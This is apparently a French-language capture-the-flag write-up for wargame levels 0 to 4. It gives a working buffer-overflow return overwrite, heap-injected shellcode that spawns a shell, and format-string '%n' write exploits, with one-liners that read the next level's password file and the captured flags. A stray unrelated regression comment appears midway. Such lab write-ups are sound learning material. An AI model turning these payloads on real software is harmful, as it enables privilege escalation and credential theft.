
level0:
	
	cmd:
		ls -la at 'home/user/level0'

	observations:
		see 'level0' owned by level1
	
	strategie:
		Decompile executable '/home/user/level0/level0'
		see condition that blocks if input is different than "423"
		then it executes an execv command with the rights of the executable owner so 'level01'
	
	commandes:
		"./level0 423"
		"cat /home/user/level1/.pass"
	
	pass:
		1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a


level1:
	
	gdb mettre breakpoint dans gets
	
	cmd:
		"(python -c "print('T'*76 + '\x44\x84\x04\x08')" ; echo 'cat /home/user/level2/.pass') | ./level1"
	
	pass:
		53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
	
	0xbffff6f0	addresse du debut de la memoire des variables locales
	0xbffff6dc addresse de stockage de l'address de retour du get

	addresse de la fonction:
		0x08048444
		\x44\x84\x04\x08

	exemple saut addresse en assembleur:
		0:	b8 44 84 04 08			mov		$0x8048444,%eax
		5:	ff e0					jmp		*%eax


level2:

	strategie:
		Il y a une securite nous empechant de sauter directement dans une zone memoire haute.
		Nous allons donc sauter dans une zone memoire basse: soit la heap.
		
		Grace au buffer overflow nous allons remplir le tableau avec du code operationnel,
		ainsi que modifier l'addresse de retour de la fonction <p> pour pointer vers la heap.
		Le tableau est par la suite copie dans la heap a l'aide de strdup.
		
		Notez la presence du '1' dans la derniere case du tableau qui est ensuite decremente.
		Cela permet a notre tableau d'etre termine par un '\0' sans pour autant en avoir un dans le code operationnel.
		Permettant ainsi a strdup de copier l'integralite de notre code !

		Aussitot que la fonction <p> ordonne le retour, notre code injecte dans la heap
		est execute et nous avons acces au terminal en tant qu'utilisateur 'level3'.

	fonction en c:
		void f()
		{ 
		        char cmd[3] = {'s', 'h', '\01'};

				--cmd[2];
		        system(cmd);
		}

	fonction en asm:	
		08048474 <f>:
		 8048474:	55                   	push   %ebp
		 8048475:	89 e5                	mov    %esp,%ebp
		 8048477:	83 ec 28             	sub    $0x28,%esp
		 804847a:	c6 45 f5 73          	movb   $0x73,-0xb(%ebp)
		 804847e:	c6 45 f6 68          	movb   $0x68,-0xa(%ebp)
		 8048482:	c6 45 f7 01          	movb   $0x1,-0x9(%ebp)
		 8048486:	0f b6 45 f7          	movzbl -0x9(%ebp),%eax
		 804848a:	83 e8 01             	sub    $0x1,%eax
		 804848d:	88 45 f7             	mov    %al,-0x9(%ebp)
		 8048490:	8d 45 f5             	lea    -0xb(%ebp),%eax
		 8048493:	89 04 24             	mov    %eax,(%esp)
		 8048496:	e8 e5 fe ff ff       	call   8048380 <system@plt>
		 804849b:	c9                   	leave  
		 804849c:	c3                   	ret

	cmd gdb [a la ligne <p+105>]:
		p/x $eax
		 |-> 0x804a008
		 |
		 `-> Nous donne l'address de retour de strdup soit l'emplacement du code dans la heap

	doutes:
		Je dois verifier que l'addresse de la fonction 'system'
		est bien la meme a l'execution du programme level2

	cmd gdb:
		(gdb) info address system
		 |-> Symbol "system" is at 0xb7e6b060 in a file compiled without debugging.
		 |
		 `-> J'adapte donc le code avec l'addresse memoire: '\x60\xb0\xe6\xb7'

	observations:
		L'addresse d'appel a system est change a '0xbfeb508f' a l'execution,
		je dois trouver un moyen pour corriger cela.

	solution:
		Le decalage de l'addresse est applique par l'instruction call pour retrouver la librairie partagee (.so shared library).
		Je calcule donc l'offset (0xbfeb508f)3219869839 - (0xb7e6b060)3085348960 = 134520879.
		Je l'applique ensuite a mon address de depart (0xb7e6b060)3085348960 - 134520879 = (0xafe21031)2950828081.
		Puis j'adapte le code operationel avec l'addresse '0xafe21031' soit '\x31\x10\xe2\xaf'.

	opcode [42 octets]:
		\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x31\x10\xe2\xaf\xc9\xc3\x00

	cmd:
		(python -c "print('\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x31\x10\xe2\xaf\xc9\xc3\x00' + '\x00'*(64 - 42 + 16) + '\x08\xa0\x04\x08')" ; echo 'cat /home/user/level3/.pass') | ./level2
	
	pass:
		492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02


level3:

	doc (Exploiting Format String Vulnerabilities):
		https://cs155.stanford.edu/papers/formatstring-1.2.pdf

	gdb cmd:
		b *v+59
		run </dev/null
		p &m			// addresse de variable 'm'
		 `-> 0x804988c
		x $ebp + 4		// addresse de retour fonction avec ca valeur
		 `-> 0xbffff72c:     0x08048525

	cmd:
	 |-> python -c "print('%x'*512)" | ./level3
	 |
	 `->      200b7fd1ac0b7ff37db7fed280       0bffff768 8048525 8048530       0       0b7e454d3       1bffff804bffff80cb7fdc858       0bffff81cbffff80c       0 8048258b7fd0ff4       0       0       066c0840851874018       0       0       0       1 80483f0       0b7ff26b0b7e453e9b7ffeff4       1 80483f0       0 8048411 804851a       1bffff804
	   200b7fd1ac0b7ff37db7fed280   0bffff76880485258048530   0   0b7e454d3   1bffff804bffff80cb7fdc858   0bffff81cbffff80c   08048258b7fd0ff4   0   0   082099a00b54e5e10   0   0   0   180483f0   0b7ff26b0b7e453e9b7ffeff4   180483f0   08048411804851a   1bffff804
	
	observation:
		L'addresse de la variable 'm' est 0x804988c
		La memoire peut etre modifiee avec '%n', cet operateur inscrit une valeur entiere comprenant le nombre de caracteres precedement affiche par printf.
	
	strategie:
		Definir l'adresse de la variable 'm' dans la stack puis lire cette derniere a l'aide de '%x' pour ensuite pouvoir modifier la valeur 'm' en `64` grace a l'operateur '%n'.

	solution:
		(python -c "print('\x8c\x98\x04\x08' + 'E'*(64 - 23) + '%x'*3 + '%n')"; echo 'cat /home/user/level4/.pass') | ./level3

	pass:
		b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

/*
	Pour linear regression

	km_mid = (km_max - km_min) / 2
	km = (km - km_min - km_mid) / km_mid
*/


level4:

	outils:
		https://hex-works.com/

	observations:
		Code similaire au level3 excepte que la fonction printf est encapsule dans une autre fonction et la valeur de passage est '16930116' soit '01025544' en hexadecimal.
		Etant donne que la valeur a injecter est tres grande nous ne pouvons pas ecrire celle si en une seul chaine simple, 16930116 carateres etant plus grand que le buffer.

	strategie:
		Changer la memoire en plusieurs parties pour que la chaine de carateres necessaire soit repartie sur les differents octets.
		Dans notre cas en 3 parties: AD+0 AD+1 AD+2 FIL1 %N FIL2 %N FIL3 %N

	tentative:
		python -c "print('\x8c\x98\x04\x08' + 'E'*(64 - 23) + '%x'*3 + '%n')" | ./level4

	solution:
		python -c "print('\x10\x98\x04\x08' + '\x11\x98\x04\x08'+ '\x12\x98\x04\x08' + '%46.c' + '%c'*10 + '%n' + 'H'*17 + '%n' + 'T'*173 + '%n')" | ./level4

	pass:
		0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

level5:

	

	